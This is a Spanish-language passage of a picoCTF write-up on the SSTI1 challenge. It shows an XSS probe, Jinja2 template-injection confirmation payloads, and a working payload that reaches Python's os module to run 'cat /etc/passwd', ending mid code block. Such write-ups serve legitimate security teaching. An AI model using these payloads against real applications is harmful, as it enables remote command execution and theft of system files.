# 🚀 Solución PicoCTF: SSTI1
> **Vulnerabilidad:** Server Side Template Injection (SSTI)  
> **Plataforma:** [picoCTF](https://play.picoctf.org/)  
> **Basado en:** Tutorial de S4vitar (S4viSinFiltro)

---

## 🔍 1. Fase de Reconocimiento
Al interactuar con la web, observamos un campo que refleja nuestro texto. Probamos lo siguiente:

* **XSS:** `<script>alert(1)</script>` (Funciona, pero no es el objetivo).
* **Tecnologías:** Mediante `whatweb` se detecta el uso de **Python**. Esto nos da una pista clave: el motor de plantillas podría ser **Jinja2**.

## 🧪 2. Confirmación del SSTI
Para verificar si el servidor evalúa expresiones matemáticas dentro de llaves `{{ }}`, enviamos:

| Payload | Resultado Esperado | Resultado Servidor |
| :--- | :--- | :--- |
| `{{ 8 * 8 }}` | `64` | **64** ✅ |
| `{{ 7 * '7' }}` | `7777777` | **7777777** ✅ |


## 💀 3. Explotación y RCE
Una vez confirmado **Jinja2**, buscamos obtener ejecución remota de comandos (**RCE**) para leer archivos del sistema.

### Lectura de archivos locales (LFI)
Utilizamos introspección de objetos en Python para acceder al módulo `os`:
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}
